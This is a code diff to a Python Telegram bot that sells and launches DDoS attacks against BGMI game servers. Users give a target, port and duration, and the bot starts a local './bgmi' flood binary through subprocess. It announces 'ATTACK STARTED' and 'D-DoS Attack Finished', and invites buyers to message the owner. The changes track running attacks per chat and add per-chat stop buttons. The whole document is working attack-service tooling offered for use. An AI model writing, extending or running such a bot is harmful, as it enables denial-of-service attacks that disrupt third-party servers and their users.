@@ -14,7 +14,7 @@ DB_FILE = 'bot_data.db'
 keep_alive()
 initialize_db()
 
-Attack = None
+Attack = {}
 
 def db_connection():
     conn = sqlite3.connect(DB_FILE)
@@ -406,16 +406,18 @@ def initialize_bot(bot, bot_id):
         response = f"🤖Your ID: {user_id}"
         bot.reply_to(message, response)
     
-    def start_attack_reply(message, target, port, time):
+    def start_attack_reply(message, target, port, time, owner_name):
         user_info = message.from_user
         username = user_info.username if user_info.username else user_info.first_name
+        chat_id = message.chat.id
         global Attack
         full_command = ['./bgmi', str(target), str(port), str(time), '900']
-        Attack = subprocess.Popen(full_command)
+        attack_process = subprocess.Popen(full_command)
+        Attack[chat_id] = attack_process
         scheduled_time = datetime.now() + timedelta(seconds=time)
         Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack"))
+        markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack_" + str(chat_id)))
         response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
         bot.reply_to(message, response, reply_markup=markup)
     
@@ -446,7 +448,7 @@ def initialize_bot(bot, bot_id):
                     bot.reply_to(message, response)
                 else:
                     log_command(user_id, target, port, time, '/bgmi')
-                    start_attack_reply(message, target, port, time)  
+                    start_attack_reply(message, target, port, time, owner_name)  
             else:
                 response = "✅ Usage :- /bgmi <target> <port> <time>"
                 bot.reply_to(message, response)
@@ -456,23 +458,28 @@ def initialize_bot(bot, bot_id):
 
     def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
         global Attack
+        chat_id = message.chat.id
         while datetime.now() < scheduled_time:
             time.sleep(1)
-        
-        if Attack is not None:
+    
+        if chat_id in Attack and Attack[chat_id] is not None:
             response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
             bot.reply_to(message, response)
     
-    @bot.callback_query_handler(func=lambda call: True)
+    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_attack_"))
     def handle_callback_query(call):
-        if call.data == "stop_attack":
-            global Attack
-            if Attack is not None:
-                Attack.terminate()
-                bot.reply_to(call.message.chat.id, "Attack stopped successfully.")
-                Attack = None
-            else:
-                bot.reply_to(call.message.chat.id, "No running attacks to be stopped.")
+        chat_id = int(call.data.split("_")[-1])
+        if chat_id in Attack and Attack[chat_id] is not None:
+            Attack[chat_id].kill()
+            try:
+                Attack[chat_id].wait(timeout=5)
+                response = "Attack stopped successfully."
+            except subprocess.TimeoutExpired:
+                response = "Failed to stop the attack in time."
+            Attack[chat_id] = None
+        else:
+            response = "No running attacks to be stopped."
+        bot.reply_to(call.message, response)
     
     @bot.message_handler(commands=['help'])
     def show_help(message):
